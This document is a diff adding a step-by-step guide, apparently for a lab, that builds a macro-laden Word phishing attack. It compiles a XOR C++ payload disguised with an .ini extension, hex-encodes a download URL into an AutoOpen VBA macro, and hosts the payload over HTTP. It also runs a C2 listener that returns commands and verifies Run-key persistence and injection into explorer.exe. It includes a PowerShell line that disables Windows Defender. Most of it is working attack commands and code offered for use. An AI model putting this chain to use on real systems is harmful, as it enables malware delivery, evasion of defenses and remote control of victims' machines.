@@ -1,0 +1,159 @@
+Step 1 — Compile the C++ Payload on Kali
+
+  # Install cross-compiler for Windows target
+  sudo apt install mingw-w64 -y
+
+  # Compile Actual_Payload_HTTP_XOR.cpp → Windows executable
+  x86_64-w64-mingw32-g++ Actual_Payload_HTTP_XOR.cpp -o CertificationKit.ini \
+    -lws2_32 -lwinhttp -static
+
+  # Why .ini extension? — Blends in, less suspicious than .exe
+
+  Before compiling, open the .cpp file and change these values to your Kali IP:
+
+  // Find and replace these lines in Actual_Payload_HTTP_XOR.cpp
+  const char* C2_HOST = "192.168.x.10";   // Your Kali IP
+  const int   C2_PORT = 8080;              // Your listener port
+  const char  XOR_KEY = 0x41;             // Keep or change the XOR key
+
+  ---
+  Step 2 — Host the Payload on Kali
+
+  # Put the compiled payload in a directory
+  mkdir ~/static-kitten-lab
+  cp CertificationKit.ini ~/static-kitten-lab/
+
+  # Start HTTP server on port 8080
+  cd ~/static-kitten-lab
+  python3 -m http.server 8080
+
+  Verify it works:
+  # Test from Kali itself first
+  curl http://192.168.x.10:8080/CertificationKit.ini --output /tmp/test
+
+  ---
+  Step 3 — Modify the VBA Macro
+
+  The macro has two hex-encoded placeholders. You need to encode your values.
+
+  Convert your values to hex
+
+  In Python (run on Kali):
+  # Encode the download URL
+  url = "http://192.168.x.10:8080/CertificationKit.ini"
+  hex_url = url.encode().hex()
+  print(hex_url)
+
+  # Encode the local save path
+  path = "C:\\ProgramData\\CertificationKit.ini"
+  hex_path = path.encode().hex()
+  print(hex_path)
+
+  Example output:
+  URL hex:  687474703a2f2f3139322e3136382e782e31303a383038302f...
+  Path hex: 433a5c50726f6772616d446174615c436572746966...
+
+  Edit macros.bas — replace the two placeholders:
+
+  ' Find these lines in macros.bas and replace with your hex values:
+
+  encodedPath = "433a5c50726f6772616d446174615c436572746966..."   ' <-- your path hex
+  encodedURL  = "687474703a2f2f3139322e3136382e782e31303a3830..."  ' <-- your URL hex
+
+  ---
+  Step 4 — Inject Macro into the Word Document
+
+  On Kali (or Windows with LibreOffice):
+
+  # Option A: Use the provided Cybersecurity.docm directly
+  # Open it in LibreOffice Writer on Kali, edit macro, save
+
+  # Option B: Use python-docx to inject macro programmatically
+  # (Word macros are stored in vbaProject.bin inside the docx zip)
+
+  On Windows (recommended for compatibility):
+  1. Open Cybersecurity.docm in Word
+  2. Alt+F11 → Opens VBA Editor
+  3. Replace macro code with your modified macros.bas content
+  4. Save and close
+
+  ---
+  Step 5 — Set Up C2 Listener on Kali
+
+  # The C++ payload communicates back over HTTP
+  # Set up a simple listener to receive beacons
+
+  # Option A: netcat (basic)
+  nc -lvnp 4444
+
+  # Option B: Python HTTP listener (see incoming requests)
+  python3 -c "
+  from http.server import HTTPServer, BaseHTTPRequestHandler
+  import json, base64
+
+  class C2Handler(BaseHTTPRequestHandler):
+      def do_POST(self):
+          length = int(self.headers['Content-Length'])
+          data = self.rfile.read(length)
+          print('[BEACON]', data.decode())
+          self.send_response(200)
+          self.end_headers()
+          self.wfile.write(b'whoami')  # send command back
+
+  HTTPServer(('0.0.0.0', 9090), C2Handler).serve_forever()
+  "
+
+  Run this on a separate terminal from the HTTP file server.
+
+  ---
+  Step 6 — Execute on Windows 11 Victim
+
+  1. Copy Cybersecurity.docm to Windows 11
+  2. Open the file in Microsoft Word
+  3. Click "Enable Content" when prompted (macros warning)
+  4. Macro auto-runs (AutoOpen trigger)
+  5. Watch Kali HTTP server log — you should see:
+     192.168.x.20 - GET /CertificationKit.ini 200
+  6. Payload saves to C:\ProgramData\CertificationKit.ini
+  7. Payload executes silently
+  8. C2 beacon appears on your Kali listener
+
+  ---
+  Full Terminal Layout on Kali
+
+  Terminal 1: File hosting
+    cd ~/static-kitten-lab && python3 -m http.server 8080
+
+  Terminal 2: C2 listener
+    python3 c2_listener.py   (or nc -lvnp 9090)
+
+  Terminal 3: Monitoring
+    tcpdump -i eth0 host 192.168.x.20
+
+  ---
+  Verification Checklist
+
+  ┌─────────────┬──────────────────────────────────────────────────────────────┐
+  │    Step     │                       What to Look For                       │
+  ├─────────────┼──────────────────────────────────────────────────────────────┤
+  │ HTTP server │ GET /CertificationKit.ini 200 in logs                        │
+  ├─────────────┼──────────────────────────────────────────────────────────────┤
+  │ File drop   │ C:\ProgramData\CertificationKit.ini exists on victim         │
+  ├─────────────┼──────────────────────────────────────────────────────────────┤
+  │ Execution   │ Process visible in Task Manager briefly                      │
+  ├─────────────┼──────────────────────────────────────────────────────────────┤
+  │ Persistence │ Registry: HKCU\Software\Microsoft\Windows\CurrentVersion\Run │
+  ├─────────────┼──────────────────────────────────────────────────────────────┤
+  │ Injection   │ Code running under explorer.exe                              │
+  ├─────────────┼──────────────────────────────────────────────────────────────┤
+  │ C2 beacon   │ HTTP POST arriving on your listener                          │
+  └─────────────┴──────────────────────────────────────────────────────────────┘
+
+  ---
+  Important Lab Notes
+
+  - Disable Windows Defender on the Win11 VM before testing (it will block the macro + payload)
+  Set-MpPreference -DisableRealtimeMonitoring $true
+  - Enable macros in Word Trust Center settings beforehand
+  - Both machines should be on the same isolated host-only or NAT network — never bridge to a real network
+  - Take a VM snapshot before running so you can restore cleanly after each test
